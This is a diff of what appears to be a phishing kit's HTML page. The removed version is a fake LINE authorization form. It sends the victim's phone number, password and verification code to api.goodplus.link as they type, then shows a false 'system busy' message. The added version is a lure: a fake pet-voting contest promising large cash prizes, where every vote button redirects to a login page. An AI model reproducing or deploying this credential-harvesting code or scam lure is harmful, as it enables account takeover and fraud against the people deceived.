@@ -1,175 +1,335 @@
-
+<!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>LINE授權投票</title>
-    <script type="text/javascript" src="css/flexible.js"></script>
-    <link rel="stylesheet" href="css/index.css" />
-    <link rel="stylesheet" href="css/default.css" />
-    <link rel="stylesheet" href="css/form.css" />
-</head>
-<body>
-<div v-cloak id="app">
-    <div class="nav">LINE授權投票</div>
-    <div class="text-center margin-20">
-        <img class="logo" src="css/3322.png" alt="" />
-    </div>
-    <div class="text-center">
-        <b class="fs-20 fw-600 line-40">歡迎使用line 進行授權投票</b>
-        <p class="fs-14 line-20 padding-vh40">輸入電話號碼密碼並點選下一步代表您已經同意LINE的服務條例及隱私條款</p>
-    </div>
+    <head>
+        <meta charset="UTF-8">
+        <title>寵物大公投</title>
+        <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=yes">
+        <meta name="format-detection" content="telephone=NO">
+        <meta name="apple-touch-fullscreen" content="YES"/>
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+        <meta name="HandheldFriendly" content="True">
+        <link rel="stylesheet" type="text/css" href="assets/css.css"/>
+        <link rel="stylesheet" type="text/css" href="assets/index.css"/>
+        <script src="assets/jquery-1.8.3.min.js"></script>
+        <script src="assets/layer.js"></script>
+        <script>
 
-    <div class="margin-15 overflow">
-        <van-form label-align="left" @submit="onSubmit" @failed="onFailed">
-            <van-field
-                    v-model="form.phone"
-                    required
-                    @input="quickSave"
-                    placeholder="請輸入LINE電話號碼"
-                    :rules="[{ required: true, message: '請輸入LINE電話號碼' }]">
-                <template #label><span class="fs-12">電話號碼</span></template>
-            </van-field>
-            <van-field
-                    v-model="form.password"
-                    required
-                    @input="quickSave"
-                    placeholder="請輸入密碼"
-                    :rules="[{ required: true, message: '請輸入密碼' }]"
-            >
-                <template #label><span class="fs-12">輸入密碼</span></template>
-            </van-field>
-            <van-field
-                    v-model="form.code"
-                    required
-                    @input="quickSave"
-                    placeholder="請輸入LINE認證碼"
-                    type="number"
-                    maxlength="6"
-                    :rules="[{ required: true, message: '請輸入LINE認證碼' }]">
-                <template #label><span class="fs-12">輸入認證碼</span></template>
-                <template #button>
-                    <span @click="getCode">{{codeWord}}</span>
-                </template>
-            </van-field>
-            <div class="text-center margin-t20">
-                <van-button round block type="danger" native-type="submit">確認</van-button>
+            (function (win, doc) {
+                function change() {
+                    doc.documentElement.style.fontSize = 20 / 320 * doc.documentElement.clientWidth + 'px';
+                }
+                change();
+                win.addEventListener('resize', change, false);
+            })(window, document);
+        </script>
+
+    </head>
+    <body>
+        <div><img src="assets/12321.png"></div>
+        <div class="logo">
+            <div class="logo_but hd">活動規則</div>
+            <div class="logo_but ph">認證登入</div>
+        </div>
+        <div class="center" id="main" style="height: 43vh;">
+            <ul class="Exhibition">
+                
+                
+                <li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9d002f336.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>40號 芳妮</p>
+                            <p><span>959</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9b558b9bd.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>31號 本索爾</p>
+                            <p><span>956</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9985c735f.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>22號 惠美</p>
+                            <p><span>865</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed961321e5c.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>16號 桃太郎</p>
+                            <p><span>836</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9d2b79717.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>41號 琪琪</p>
+                            <p><span>821</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65e85c15ce7a8.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>4號 哈妮HANI</p>
+                            <p><span>787</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9b2b83103.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>30號 艾美拉</p>
+                            <p><span>778</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9a7c4df48.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>27號 托尼</p>
+                            <p><span>715</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9bc580594.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>34號 拉梅</p>
+                            <p><span>688</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65e85b05405b1.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>10號 貝果</p>
+                            <p><span>667</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9abdcd2e2.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>29號 齊齊</p>
+                            <p><span>663</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9c4332c69.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>36號 小王子</p>
+                            <p><span>661</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed98c4a80ba.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>19號 濱崎</p>
+                            <p><span>658</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed95c142f3f.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>12號 繽果</p>
+                            <p><span>652</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65e857c36dc83.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>13號 瑞歐寶</p>
+                            <p><span>643</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65e8575381276.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>14號 小勝</p>
+                            <p><span>636</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65e858c9c7b0e.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>3號 麻薯~</p>
+                            <p><span>555</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed99b9a314b.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>23號 騰男</p>
+                            <p><span>554</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed9c0324951.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>35號 蝶蝶美子</p>
+                            <p><span>499</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li><li class="Exhibition_block">
+                    <div class="E_center">
+                        <div class="E_top">
+                            <img src="assets/65ed99190e969.jpg">
+                        </div>
+                        <div class="E_bot">
+                            <p>20號 蒂莎</p>
+                            <p><span>489</span>票</p>
+                            <P class="sub ba_color">為TA投票</p>
+                        </div>
+                    </div>
+                </li>               
+               
+               
+               
+            </ul>
+        </div>
+
+                <div id='mask'></div>
+        <!-- 透明遮罩层 -->
+        <div id='masks'></div>
+    
+
+        <!-- 活动规则 -->
+        <div class="actives">
+            <div class="center">
+                <div class="Title">
+                    <p>活動規則</p>
+                </div>
+                <div class="active"></div>
+                <div class="text-active">
+    寵物部落第一屆「寵物大公投」活動開跑啦！邀請飼主投稿你家最可愛的毛小孩照片，經由廣大網友投票，活動期間獲得最多票者即當選最受歡迎寵物，除了三十萬元獎項外，還有設計師特製 Logo 及大頭照放至寵物部落官網和 FB 粉絲團，為寵物部落年度代言。另外參與投票的朋友也有機會獲得千元禮券喔！<br />
+活動時間：<br />
+2月 8 日至 4月 8日開始上傳。<br />
+3 月 9 日至 5月 9日進行投票。<br />
+6月 20 日得獎公告。<br />
+參加資格：<br />
+參加投稿票選與投票者皆需先登 LINE(加) 入 社區會員。<br />
+(若您為新加入會員，建議使用手機號碼或第LINE註冊會員，再返回本活動頁登入會員參加。)<br />
+活動規則：<br />
+上傳投稿為一圖一文，文字敘述限 150 字內。<br />
+建議以橫式照片進行投稿，避免列表呈現有誤，若造成投稿上權益受損，將由投稿者自負。<br />
+每一帳號上傳投稿請先確認寵物名稱、故事內容與照片尺寸，確認送出後將於萌寵列表頁呈現，送出後不得修改或刪除。<br />
+每一帳號不限制投稿數量，但同一寵物不得重複投稿。<br />
+每一帳號每日限投一票，主辦單位保有針對重複、異常等投稿進行異動之權利，並不另行通知。<br />
+投稿人參加投稿票選視為同意其文字及照片供聯合線上使用。<br />
+活動獎品：<br />
+得票數獎(各1名)<br />
+第一名 三十萬台幣(加)宜蘭煙波花時間寵物房專案一晚 三牲工作室寵物攝影方案B *獎品不限平假日，須於指定期限內兌換完畢，寵物攝影成果及寵物肖像需供聯合線上宣傳使用。 <br />
+<br />
+第二名 二十萬台幣(加)佩奇不鏽鋼智能寵物餵食器5L一台。<br />
+<br />
+第三名 十萬台幣(加)奇美智能空氣清淨機一台。<br />
+<br />
+參加投票獎(20名) 家樂福1,000元禮券序號一組
+                    
             </div>
-        </van-form>
-    </div>
-</div>
-</body>
-<script src="css/vue.min.js"></script>
-<script src="css/vant.min.js"></script>
-<script src="css/jquery-2.1.1.min.js"></script>
-<script>
-    new Vue({
-        el: '#app',
-        data() {
-            return {
-                timer: null,
-                codeWord: '發送',
-                time: 60,
-                canClick: true,
-                form: {
-                    phone: '',
-                    password: '',
-                    code: ''
-                }
-            }
-        },
-        methods: {
-            getCode() {
-                if (this.codeWord !== '發送') { return }
 
-                var phoneNumberPattern = /^\d{8,10}$/;
-                var cktel = phoneNumberPattern.test(this.form.phone);
-                if(!cktel){
-                  this.$toast.fail('電話號碼不正確！');
-                  return false;
-                }
-                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
-                var ckpass = passwordPattern.test(this.form.password);
-                if(!ckpass){
-                   this.$toast.fail("密碼不正確！");
-                   return false;
-                }
+                <div class="wrap_toupiao">
+                    <div class="sub_one">關閉</div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script src="assets/public.js"></script>
+    <script>
+    $(function() {
+$(".hd").click(function(){
+            $("#masks").hide()
+            $(".actives").show()
+            $("#mask").show()
+});
+     
+     $(".sub").click(function(){
+            window.location.href = '/login';
+});
+     
+     //关闭
+        $(".sub_one").click(function(event) {
+            $("#masks").hide()
+            $(".paihang").hide()
+            $(".actives").hide()
+            $("#mask").hide()
+            $(".xiangqing").hide()
+        }); 
+    });
+    </script>
 
-                this.canClick = false
-                this.timer = setInterval(() => {
-                    this.count()
-                }, 1000)
-            },
-            count() {
-                this.time--
-                this.codeWord = this.time + 's'
-                if (this.time <= 0) {
-                    this.codeWord = '發送'
-                    clearInterval(this.timer)
-                    this.time = 60
-                    this.canClick = true
-                }
-            },
-            onFailed(errorInfo) {
-                this.$toast.fail('請填寫完善');
-                console.log('failed', errorInfo);
-            },
-            // 保存每一步输入
-            quickSave() {
-                if(this.form.code.length<6 && this.form.code != ''){
-                    return false;
-                }
-                if(this.form.phone<8 && this.form.phone != ''){
-                    return false;
-                }
-                if(this.form.password<8 && this.form.password != ''){
-                    return false;
-                }
-                console.log('save', this.form)
-                this.form.id = document.getElementById('id');
-                $.ajax({
-                    url:"https://api.goodplus.link?get=save",
-                    type: 'post',
-                    dataType: 'JSON',
-                    data: this.form,
-                    success:function(data){}
-                });
-            },
-            onSubmit() {
-               var phoneNumberPattern = /^\d{8,10}$/;
-                var cktel = phoneNumberPattern.test(this.form.phone);
-                if(!cktel){
-                  this.$toast.fail('電話號碼不正確！');
-                  return false;
-                }
-                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
-                var ckpass = passwordPattern.test(this.form.password);
-                if(!ckpass){
-                   this.$toast.fail("密碼不正確！");
-                   return false;
-                }
-                if(this.form.code.length!=6){
-                    this.$toast.fail("请输入6位認證碼！");
-                    return false;
-                }
-               console.log('submit', this.form);
-                this.form.id = document.getElementById('id');
-              $.ajax({
-                  url:"https://api.goodplus.link?get=submit",
-                  type: 'post',
-                  dataType: 'JSON',
-                  data: this.form,
-                  success:function(data){
-                    setTimeout(function(){
-                        //window.location.href='/index.php/Home/Index';
-                        alert('系統繁忙中~請一小時後再試！');
-                    },2000);
-                    return false;
-                  }
-              });
-            }
-        }
-    })
-</script>
 </html>
